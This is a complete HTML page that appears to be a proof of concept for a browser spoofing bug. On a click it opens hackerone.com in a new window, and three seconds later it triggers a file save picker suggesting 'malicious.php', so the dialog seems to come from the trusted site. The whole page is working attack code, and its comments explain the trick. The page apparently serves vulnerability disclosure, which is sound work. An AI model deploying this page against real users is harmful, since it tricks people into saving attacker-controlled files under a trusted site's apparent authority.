<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Save Picker</title>
  <style>
    body { margin:0; height:100vh; display:flex; justify-content:center; align-items:center;
           font-family:sans-serif; background:#fafafa; cursor:pointer; user-select:none; }
    h1 { color:#333; text-align:center; max-width:420px; padding:20px; }
  </style>
</head>
<body>
  <h1>Click me anywhere.</h1>

  <script>
    const TRUSTED_URL = 'https://hackerone.com';
    const PICKER_AFTER_MS = 3000;

    document.addEventListener('click', () => {
      // 1) Redirect FIRST (window.open keeps this page alive so the timer below still runs).
      window.open(TRUSTED_URL);

      // 2) After 3s, the picker opens — over the redirected trusted site.
      setTimeout(() => {
        window.showSaveFilePicker({
          suggestedName: 'malicious.php',
          types: [{ description: 'Text Files', accept: { 'text/plain': ['.php'] } }]
        }).catch(() => {});
      }, PICKER_AFTER_MS);
    }, { once: true });
  </script>
</body>
</html>
